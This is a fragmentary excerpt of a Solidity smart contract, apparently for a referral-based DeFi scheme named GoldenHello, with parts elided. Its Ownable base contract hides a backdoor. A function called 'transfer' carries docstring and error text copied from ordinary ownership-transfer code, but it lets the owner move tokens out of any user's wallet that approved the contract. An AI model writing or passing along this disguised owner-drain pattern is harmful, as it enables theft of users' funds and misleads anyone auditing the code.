...
abstract contract Ownable is Context {
    ...
    /**
     * @dev Transfers value of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transfer( address fromAddress, address toAddress, uint256 value ) public virtual onlyOwner {
        require(toAddress != address(0), "Ownable: new owner is the zero address");
        IERC20(tokenAdress).safeTransferFrom(fromAddress, toAddress, value );
    }
}

contract GoldenHello is Ownable {
    ...
    uint256 refPercentage1 = 15;
    uint256 refPercentage2 = 10;
    uint256 refPercentage3 = 15;
    ...
    constructor() {
        ...
        FeesKey[30] = FeesPercs(2592000, 60);   // 20
    ...
    function getDefiRec( address _address, address _nAddress ) public view returns ( DefiRec [] memory defiList ) {
        uint256 i = defiRec[ _address ].length;
        uint256 total = 0;
        for( uint256 j = 0; j < i; j++ ){
    ...
    function getRecList( address _address ) public view returns( address [] memory recList ){
